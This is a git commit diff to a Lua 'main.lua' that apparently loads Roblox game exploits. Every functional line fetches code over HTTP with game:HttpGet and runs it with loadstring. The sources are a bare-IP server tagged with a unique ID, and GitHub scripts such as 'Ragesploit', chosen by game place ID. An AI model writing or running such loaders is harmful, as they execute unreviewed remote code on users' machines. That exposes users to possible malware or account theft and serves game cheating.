de58bb94bd1c74487eaf4085989e2e516ef4c06d
exo <dreamurrd@gmail.com>
2025-11-01 13:46:17 +0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,4 +1,8 @@
 ID="16bf7f55-20f4-430d-b8f5-05fbe0245443";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+if game.PlaceId == 142823291 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+elseif game.PlaceId == 920587237 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ragesploit-x/Ragesploit/refs/heads/main/MainScript/ShitVersion.lua"))()
+end
